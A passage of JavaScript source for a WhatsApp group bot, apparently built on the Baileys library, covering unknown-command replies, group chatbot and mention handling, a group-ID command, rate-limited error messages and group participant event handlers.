`;
                        });
                        unknownMsg += `
📋 Sari commands dekhne ke liye: \`.help\``;
                    } else {
                        unknownMsg += `📋 Sari commands dekhne ke liye: \`.help\`
`;
                        unknownMsg += `🔍 Koi suggestion nahi mili, command dobara check karein.`;
                    }

                    await sock.sendMessage(chatId, {
                        text: unknownMsg,
                        ...channelInfo
                    }, { quoted: message });

                    commandExecuted = true;
                } else {
                    if (isGroup) {
                        // Handle non-command group messages
                        if (userMessage) {
                            await handleChatbotResponse(sock, chatId, message, userMessage, senderId);
                        }
                        await handleMentionDetection(sock, chatId, message);
                    }
                    commandExecuted = false;
                }
                break;
        }

        // If a command was executed, show typing status after command execution
        if (commandExecuted !== false) {
            // Command was executed, now show typing status after command execution
            await showTypingAfterCommand(sock, chatId);
        }

        // Function to handle .groupjid command
        async function groupJidCommand(sock, chatId, message) {
            const groupJid = message.key.remoteJid;

            if (!groupJid.endsWith('@g.us')) {
                return await sock.sendMessage(chatId, {
                    text: "❌ This command can only be used in a group."
                });
            }

            await sock.sendMessage(chatId, {
                text: `✅ Group JID: ${groupJid}`
            }, {
                quoted: message
            });
        }

        if (userMessage.startsWith('.')) {
            // After command is processed successfully
            await addCommandReaction(sock, message);
        }
    } catch (error) {
        console.error('❌ Error in message handler:', error.message);
        // Only try to send error message if we have a valid chatId,
        // and never reply to our own messages (prevents bot replying
        // to its own "Failed to process command!" message in a loop).
        try {
            if (chatId && !message?.key?.fromMe) {
                const now = Date.now();
                global.__lastErrorReplyAt = global.__lastErrorReplyAt || {};
                const last = global.__lastErrorReplyAt[chatId] || 0;
                // Only send one error reply per chat every 30 seconds
                if (now - last > 30000) {
                    global.__lastErrorReplyAt[chatId] = now;
                    await sock.sendMessage(chatId, { text: '❌ Failed to process command!' });
                }
            }
        } catch {}
    }
}



async function handleGroupParticipantUpdate(sock, update) {
    try {
        const { id, participants, action, author } = update;

        // Check if it's a group
        if (!id.endsWith('@g.us')) return;

        // Respect bot mode: only announce promote/demote in public mode
        let isPublic = true;
        try {
            const modeData = JSON.parse(fs.readFileSync('./data/messageCount.json'));
            if (typeof modeData.isPublic === 'boolean') isPublic = modeData.isPublic;
        } catch (e) {
            // If reading fails, default to public behavior
        }

        // Handle promotion events
        if (action === 'promote') {
            if (!isPublic) return;
            await handlePromotionEvent(sock, id, participants, author);
            return;
        }

        // Handle demotion events
        if (action === 'demote') {
            if (!isPublic) return;
            await handleDemotionEvent(sock, id, participants, author);
            return;
        }

        // Handle join events
        if (action === 'add') {
            await handleJoinEvent(sock, id, participants);
        }

        // Handle leave events
        if (action === 'remove') {
            await handleLeaveEvent(sock, id, participants);
        }
    } catch (error) {
        console.error('Error in handleGroupParticipantUpdate:', error);
    }
}

// Instead, export the handlers along with handleMessages
module.exports = {
    handleIncomingCall,
    handleMessages,
    handleGroupParticipantUpdate,
    restorePendingTempBans,
    handleStatus: async (sock, status) => {
        await handleStatusUpdate(sock, status);
        await handleStatusMention(sock, status);
    }
};